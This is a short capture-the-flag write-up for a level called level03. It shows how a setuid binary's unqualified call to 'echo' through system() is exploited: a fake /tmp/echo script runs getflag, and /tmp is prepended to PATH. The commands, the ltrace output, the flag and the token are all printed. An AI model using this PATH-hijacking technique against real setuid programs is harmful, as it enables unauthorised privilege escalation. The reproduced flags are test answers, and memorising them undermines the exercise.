## FLAG: `kooda2puivaav1idi4f57q8iq`

## We have an executable
> ls -l
```
    total 12
    -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

## It ask us to exploit it
> ./level03
```
    Exploit me
```

## We use `ltrace` to intercept library calls
> ltrace ./level03
```
    __libc_start_main(0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 <unfinished ...>
    getegid()                                                                                                              = 2003
    geteuid()                                                                                                              = 2003
    setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                    = 0
    setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                    = 0
    system("/usr/bin/env echo Exploit me"Exploit me
    <unfinished ...>
    --- SIGCHLD (Child exited) ---
    <... system resumed> )                                                                                                 = 0
```
## No absolute path for ``echo`` : `system("/usr/bin/env echo Exploit me"Exploit me`
## We can exploit this using our own

------------------------------------------------

## We create the script to execute getflag
> vi /tmp/echo
```
#!/bin/bash
getflag
```
> chmod +x /tmp/echo

## We add the script's folder to the `PATH` variable
> export PATH="/tmp:$PATH"

## and execute the Program
> ./level03
```
    Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
